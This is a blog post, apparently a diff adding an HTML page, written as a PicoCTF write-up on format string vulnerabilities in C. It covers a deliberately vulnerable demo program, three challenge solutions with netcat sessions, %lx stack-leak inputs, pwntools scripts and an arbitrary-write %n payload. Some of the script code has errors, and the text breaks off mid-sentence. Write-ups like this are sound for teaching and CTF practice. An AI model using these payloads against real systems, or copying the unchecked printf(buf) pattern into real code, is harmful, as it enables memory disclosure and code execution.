@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      Week 2 - Format String Attacks from PicoCTF
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Week 2 - Format String Attacks from PicoCTF" />
+<meta name="author" content="Jake Mullins" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This week I took a look at 3 format string challenges in PicoCTF. Format string attack introduction In every computer science student’s first introduction to low-level programming in C, they are instructed to use printf to display output to the terminal, or fprintf/dprintf to write to a file or file descriptor. printf is a high-level function that is defined in the libc C API standard, and its most common implementation is in GNU’s glibc library, though others exist. The function definition is: int printf(const char *restrict format, ...); The format argument is a string that can be used define the final format of the data being written, and is frequently used as a teaching tool for demonstrating how different representations of data can mean the same thing. The ... argument is an arbitrary-length list of arguments to be passed to the format string as inputs." />
+<meta property="og:description" content="This week I took a look at 3 format string challenges in PicoCTF. Format string attack introduction In every computer science student’s first introduction to low-level programming in C, they are instructed to use printf to display output to the terminal, or fprintf/dprintf to write to a file or file descriptor. printf is a high-level function that is defined in the libc C API standard, and its most common implementation is in GNU’s glibc library, though others exist. The function definition is: int printf(const char *restrict format, ...); The format argument is a string that can be used define the final format of the data being written, and is frequently used as a teaching tool for demonstrating how different representations of data can mean the same thing. The ... argument is an arbitrary-length list of arguments to be passed to the format string as inputs." />
+<link rel="canonical" href="http://localhost:4000/year-of-hacking-0x2-copy" />
+<meta property="og:url" content="http://localhost:4000/year-of-hacking-0x2-copy" />
+<meta property="og:site_name" content="Jake Mullins" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-11T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Week 2 - Format String Attacks from PicoCTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jake Mullins"},"dateModified":"2024-04-11T00:00:00-06:00","datePublished":"2024-04-11T00:00:00-06:00","description":"This week I took a look at 3 format string challenges in PicoCTF. Format string attack introduction In every computer science student’s first introduction to low-level programming in C, they are instructed to use printf to display output to the terminal, or fprintf/dprintf to write to a file or file descriptor. printf is a high-level function that is defined in the libc C API standard, and its most common implementation is in GNU’s glibc library, though others exist. The function definition is: int printf(const char *restrict format, ...); The format argument is a string that can be used define the final format of the data being written, and is frequently used as a teaching tool for demonstrating how different representations of data can mean the same thing. The ... argument is an arbitrary-length list of arguments to be passed to the format string as inputs.","headline":"Week 2 - Format String Attacks from PicoCTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/year-of-hacking-0x2-copy"},"url":"http://localhost:4000/year-of-hacking-0x2-copy"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jake Mullins" />
+
+  <!-- Favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/assets/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#00aba9">
+  <meta name="msapplication-config" content="/assets/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+  <!-- Favicon -->
+
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">home...</a>
+<h1 class="post-title">Week 2 - Format String Attacks from PicoCTF</h1>
+<p class="post-date text-bold">
+  
+  
+    <span class="text-upcase">April 2024</span>
+  
+
+
+  
+  
+  (2348 Words, 
+  14 Minutes)
+  
+
+</p>
+
+
+  <div class="">
+    
+    <span class="tag">year-of-hacking</span>
+    
+    <span class="tag">pwn</span>
+    
+  </div>
+
+
+<p>This week I took a look at 3 format string challenges in PicoCTF.</p>
+<h1 id="format-string-attack-introduction">Format string attack introduction</h1>
+<p>In every computer science student’s first introduction to low-level programming in C, they are instructed to use <code class="language-plaintext highlighter-rouge">printf</code> to display output to the terminal, or <code class="language-plaintext highlighter-rouge">fprintf</code>/<code class="language-plaintext highlighter-rouge">dprintf</code> to write to a file or file descriptor. <code class="language-plaintext highlighter-rouge">printf</code> is a high-level function that is defined in the <code class="language-plaintext highlighter-rouge">libc</code> C API standard, and its most common implementation is in GNU’s <code class="language-plaintext highlighter-rouge">glibc</code> library, though others exist. The function definition is:
+<code class="language-plaintext highlighter-rouge">int printf(const char *restrict format, ...);</code>
+The format argument is a string that can be used define the final format of the data being written, and is frequently used as a teaching tool for demonstrating how different representations of data can mean the same thing. 
+The <code class="language-plaintext highlighter-rouge">...</code> argument is an arbitrary-length list of arguments to be passed to the format string as inputs.</p>
+
+<p>Lets look at some examples:</p>
+<pre><code class="language-C">printf("%x\n", 36); // Convert 36 to hex
+printf("%c\n", 36); // Print ascii char with value 36
+printf("%lx\n", 0x1234567890abcdef); // Print 64-bit hex number 
+printf("%d\n", 0x100); // Print 0x100 in decimal
+</code></pre>
+
+<p>Security issues can arise when an untrusted data source is given control of that format string. Take this example program:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+int main() {
+    printf("What's your name? ");
+    char inputBuf[256];
+    scanf("%s", inputBuf);
+    printf("Your name is:\n");
+    long int sensitiveItem = 0x1234567890abcdef;
+    printf(inputBuf);
+    return 0;
+}
+</code></pre>
+<p>We can compile and run this program with</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc demo.c -o demo -fno-stack-protector -z execstack -no-pie; ./demo
+</code></pre></div></div>
+<p>Since we’re given control of the format string through the <code class="language-plaintext highlighter-rouge">inputBuf</code> variable, we can try to set our own format designator to expose data on the stack:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>What's your name? %x
+Your name is:
+1f502a0
+</code></pre></div></div>
+
+<p>What happened was we made the <code class="language-plaintext highlighter-rouge">inputBuf</code> string equal to <code class="language-plaintext highlighter-rouge">%x</code>. Normally this would take the value of the next argument and represent it at as a hex string, but since there are no arguments, it then pops the data off the stack. We can use this to print out the state of the stack using a whole bunch of <code class="language-plaintext highlighter-rouge">%lx</code> format designators:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>What is your name? %lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,
+Your name is:
+44a2a0,0,7f7e6a5bbb00,c0,7f7e6a697aa0,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,0,0,0,0,0,0,0,0,0,1234567890abcdef,1,7f7e6a4eb6ca,0,401146,100000000,7fff2b8a4208,7fff2b8a4208,9551d3493ca1e505,0
+</code></pre></div></div>
+<p>We can see the sensitive data in this mess after that long string of zeroes.</p>
+
+<p>The point is, processing user input in this way can lead to all kinds vulnerabilities. This risk can be minimized by using:</p>
+<pre><code class="language-C">printf("%s", inputBuf);
+</code></pre>
+<p>Rather than</p>
+<pre><code class="language-C">printf(inputBuf);
+</code></pre>
+<h1 id="format-string-0">Format String 0</h1>
+<p>In this challenge, we get access to a port running a C binary, and the source code of the binary:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+  
+#define BUFSIZE 32
+#define FLAGSIZE 64
+  
+char flag[FLAGSIZE];
+  
+void sigsegv_handler(int sig) {
+    printf("\n%s\n", flag);
+    fflush(stdout);
+    exit(1);
+}
+  
+int on_menu(char *burger, char *menu[], int count) {
+    for (int i = 0; i &lt; count; i++) {
+        if (strcmp(burger, menu[i]) == 0)
+            return 1;
+    }
+    return 0;
+}
+  
+void serve_patrick();
+
+void serve_bob();
+  
+int main(int argc, char **argv){
+    FILE *f = fopen("flag.txt", "r");
+    if (f == NULL) {
+        printf("%s %s", "Please create 'flag.txt' in this directory with your own debugging flag.\n");
+        exit(0);
+    }
+  
+    fgets(flag, FLAGSIZE, f);
+    signal(SIGSEGV, sigsegv_handler);
+  
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+  
+    serve_patrick();
+    return 0;
+}
+  
+void serve_patrick() {
+    printf("%s %s\n%s\n%s %s\n%s",
+            "Welcome to our newly-opened burger place Pico 'n Patty!",
+            "Can you help the picky customers find their favorite burger?",
+            "Here comes the first customer Patrick who wants a giant bite.",
+            "Please choose from the following burgers:",
+            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
+            "Enter your recommendation: ");
+    fflush(stdout);
+  
+    char choice1[BUFSIZE];
+    scanf("%s", choice1);
+    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
+  ********  if (!on_menu(choice1, menu1, 3)) {
+        printf("%s", "There is no such burger yet!\n");
+        fflush(stdout);
+    } else {
+        int count = printf(choice1);
+        if (count &gt; 2 * BUFSIZE) {
+            serve_bob();
+        } else {
+            printf("%s\n%s\n",
+                    "Patrick is still hungry!",
+                    "Try to serve him something of larger size!");
+            fflush(stdout);
+        }
+    }
+}
+  
+void serve_bob() {
+    printf("\n%s %s\n%s %s\n%s %s\n%s",
+            "Good job! Patrick is happy!",
+            "Now can you serve the second customer?",
+            "Sponge Bob wants something outrageous that would break the shop",
+            "(better be served quick before the shop owner kicks you out!)",
+            "Please choose from the following burgers:",
+            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
+            "Enter your recommendation: ");
+    fflush(stdout);
+  
+    char choice2[BUFSIZE];
+    scanf("%s", choice2);
+    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
+    if (!on_menu(choice2, menu2, 3)) {
+        printf("%s", "There is no such burger yet!\n");
+        fflush(stdout);
+    } else {
+        printf(choice2);
+        fflush(stdout);
+    }
+}
+</code></pre>
+
+<p>This challenge is pretty easy. We can see that there is a custom function that is called whenever a <code class="language-plaintext highlighter-rouge">SIGSEGV</code> is thrown. All we have to do is cause a segfault:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>jakemull㉿leman-russ<span class="o">)</span>-[~/ctf/pico]
+└─<span class="nv">$ </span>nc mimas.picoctf.net 65265
+Welcome to our newly-opened burger place Pico <span class="s1">'n Patty! Can you help the picky customers find their favorite burger?
+Here comes the first customer Patrick who wants a giant bite.
+Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
+Enter your recommendation: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+There is no such burger yet!
+
+picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
+</span></code></pre></div></div>
+<p>We are able to cause the segfault because there is no error handling or input validation, allowing us to dump garbage into the stack until the program pops the garbage into <code class="language-plaintext highlighter-rouge">rip</code> register, sending a <code class="language-plaintext highlighter-rouge">SIGSEGV</code>.</p>
+
+<p>Here’s a very simple <code class="language-plaintext highlighter-rouge">pwntools</code> python script to do this programmatically</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+  
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b': '</span><span class="p">)</span>
+  
+<span class="n">conn</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b'A'</span> <span class="o">*</span> <span class="mi">128</span><span class="p">)</span>
+  
+<span class="n">resp</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'}'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<h1 id="format-string-1">Format String 1</h1>
+<p>We’re provided with a similar setup to the last challenge, an open port running a C binary with the following source code:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+
+int main() {
+  char buf[1024];
+  char secret1[64];
+  char flag[64];
+  char secret2[64];
+  
+  // Read in first secret menu item
+  FILE *fd = fopen("secret-menu-item-1.txt", "r");
+  if (fd == NULL){
+    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(secret1, 64, fd);
+  // Read in the flag
+  fd = fopen("flag.txt", "r");
+  if (fd == NULL){
+    printf("'flag.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(flag, 64, fd);
+  // Read in second secret menu item
+  fd = fopen("secret-menu-item-2.txt", "r");
+  if (fd == NULL){
+    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(secret2, 64, fd);
+  
+  printf("Give me your order and I'll read it back to you:\n");
+  fflush(stdout);
+  scanf("%1024s", buf);
+  printf("Here's your order: ");
+  printf(buf);
+  printf("\n");
+  fflush(stdout);
+  
+  printf("Bye!\n");
+  fflush(stdout);
+  
+  return 0;
+}
+</code></pre>
+
+<p>Towards the bottom, there’s a <code class="language-plaintext highlighter-rouge">printf</code> that repeats user inputted data, making it vulnerable to a format string attack to expose the state of the stack. Luckily, the contents of <code class="language-plaintext highlighter-rouge">flag.txt</code> are loaded into the stack earlier in execution.</p>
+
+<p>The most basic definition of a string is any amount of characters in memory that end with <code class="language-plaintext highlighter-rouge">0x00</code>. The format designator is <code class="language-plaintext highlighter-rouge">%s</code>. I first tried to feed <code class="language-plaintext highlighter-rouge">%s</code> characters to try and expose any cstrings in the stacks, but it didn’t yield any useful information:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>jakemull㉿leman-russ<span class="o">)</span>-[~/ctf/pico/format-string-1]
+└─<span class="nv">$ </span>nc mimas.picoctf.net 62076
+Give me your order and I<span class="s1">'ll read it back to you:
+%s%s%s%s
+Here'</span>s your order: Here<span class="s1">'s your order: (null)(null)
+Bye!
+</span></code></pre></div></div>
+<p>I tried this with a wide range of <code class="language-plaintext highlighter-rouge">%s</code> designators, and nothing happened. Turns out, the <code class="language-plaintext highlighter-rouge">%s</code> symbol resolves a pointer on the stack, and then reads it as a string, rather than pulling a string from the stack. We can get around this by pulling the raw bytes from the stack using <code class="language-plaintext highlighter-rouge">%lx</code>, which prints out the hex representation of the next 64-bit number on the stack. We can get a complete representation of the state of the stack by feeding a truly egregious amount of <code class="language-plaintext highlighter-rouge">%lx</code> symbols into the program:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(jakemull㉿leman-russ)-[~/ctf/pico/format-string-1]
+└─$ nc mimas.picoctf.net 62076
+Give me your order and I'll read it back to you:
+%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,
+Here's your order: 402118,0,79beef7a5a00,0,1592880,a347834,7ffc5f170cb0,79beef596e60,79beef7bb4d0,1,7ffc5f170d80,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531,7,79beef7bd8d8,2300000007,206e693374307250,a336c797453,9,79beef7cede9,79beef59f098,79beef7bb4d0,0,7ffc5f170d90,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+Bye!
+</code></pre></div></div>
+
+<p>We can take the stack and plug it in to cyberchef for easy processing. By removing anything that doesn’t look like a hex representation of printable characters, we get the 5 hex numbers: <code class="language-plaintext highlighter-rouge">7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531</code></p>
+
+<p>Turning the hex representation to printable characters, we get the string: <code class="language-plaintext highlighter-rouge">{FTCocip5_14m1n44x4_31y71e_g41f_}8108e1</code>. Because of endianness shenanigans, we need to reverse each 64 bit number, resulting in <code class="language-plaintext highlighter-rouge">1e8018}_f14g_e17y13_4x44n1m41_5picoCTF{</code>, then reverse the order of each number, resulting in the final flag: <code class="language-plaintext highlighter-rouge">picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}</code></p>
+
+<h1 id="format-string-2">Format String 2</h1>
+<p>The source code for this challenge reveals that all we need to do is set the <code class="language-plaintext highlighter-rouge">sus</code> variable to <code class="language-plaintext highlighter-rouge">0x67616c66</code> which is the byte representation of <code class="language-plaintext highlighter-rouge">flag</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span>  
+<span class="kt">int</span> <span class="n">sus</span> <span class="o">=</span> <span class="mh">0x21737573</span><span class="p">;</span>
+  
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+<span class="err"> </span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+<span class="err"> </span> <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  
+<span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="s">"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="err"> </span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="err"> </span> <span class="n">scanf</span><span class="p">(</span><span class="s">"%1024s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+<span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="s">"Here's your input: "</span><span class="p">);</span>
+<span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="err"> </span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  
+<span class="err"> </span> <span class="k">if</span> <span class="p">(</span><span class="n">sus</span> <span class="o">==</span> <span class="mh">0x67616c66</span><span class="p">)</span> <span class="p">{</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="s">"I have NO clue how you did that, you must be a wizard. Here you go...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  
+<span class="err"> </span> <span class="err"> </span> <span class="c1">// Read in the flag</span>
+<span class="err"> </span> <span class="err"> </span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+  
+<span class="err"> </span> <span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="err"> </span> <span class="p">}</span>
+<span class="err"> </span> <span class="k">else</span> <span class="p">{</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="s">"sus = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sus</span><span class="p">);</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">printf</span><span class="p">(</span><span class="s">"You can do better!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="err"> </span> <span class="p">}</span>
+  
+<span class="err"> </span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Surprisingly enough, if you have control over the format string, you have arbitrary write access to the entire stack, effectively allowing for remote code execution. I spent a good while trying to use the input string <code class="language-plaintext highlighter-rouge">\x60\x40\x40\x00\x00\x00\x00\x00%14$n</code> to set the value of <code class="language-plaintext highlighter-rouge">sus</code> to 4 to progress the development of the exploit. Doing some more digging, however, <code class="language-plaintext highlighter-rouge">pwntools</code> is actually smart enough to do automatic exploitation! Using the sample code from the official documentation from the <code class="language-plaintext highlighter-rouge">pwntools</code> <code class="language-plaintext highlighter-rouge">fmtstr</code> <a href="https://docs.pwntools.com/en/stable/fmtstr.html">library</a>, I can create a simple python script that automates the exploitation development process:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">**</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'rhea.picoctf.net'</span><span class="p">,</span> <span class="mi">53865</span><span class="p">)</span>
+
+<span class="c1"># Function to send payload to target
+</span><span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span> 
+	<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'rhea.picoctf.net'</span><span class="p">,</span> <span class="mi">53865</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payoad</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
+
+<span class="n">autofmt</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span> <span class="c1"># Create exploit automater
+</span><span class="n">offset</span> <span class="o">=</span> <span class="n">autofmt</span><span class="p">.</span><span class="n">offset</span>
+
+<span class="c1"># Key-value pairs for addresses and their final value after exploit
+</span><span class="n">writes</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="mh">0x404060</span><span class="p">:</span> <span class="mh">0x67616c66</span>
+<span class="p">}</span><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">writes</span><span class="p">)</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+<p>With the output being:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>jakemull㉿leman-russ<span class="o">)</span>-[~/ctf/pico/format-string-2]
+└─<span class="nv">$ </span>python3 pwn.py
+b<span class="s2">"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span><span class="se">\n</span><span class="s2">Here's your input:                                                                                                      uc    </span><span class="se">\x</span><span class="s2">00                                                                                                                                                                                                                                                    </span><span class="se">\x</span><span class="s2">00aaaaba</span><span class="sb">`</span>@@<span class="se">\n</span>I have NO clue how you did that, you must be a wizard. Here you go...<span class="se">\n</span>picoCTF<span class="o">{</span>f0rm47_57r?_f0rm47_m3m_ccb55fce<span class="o">}</span><span class="s2">"
+b'%102c%20</span><span class="nv">$llnc</span><span class="s2">%21</span><span class="nv">$hhn</span><span class="s2">%5c%22</span><span class="nv">$hhn</span><span class="s2">%245c%23</span><span class="nv">$hhnaaaaba</span><span class="sb">`</span>@@<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00c@@<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00a@@<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00b@@<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="se">\x</span>00<span class="s1">'
+</span></code></pre></div></div>
+
+<p>This garbled mess contains the flag: <code class="language-plaintext highlighter-rouge">picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}</code>, and the final payload is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00
+</code></pre></div></div>
+<p>We can test this using the commands:</p>
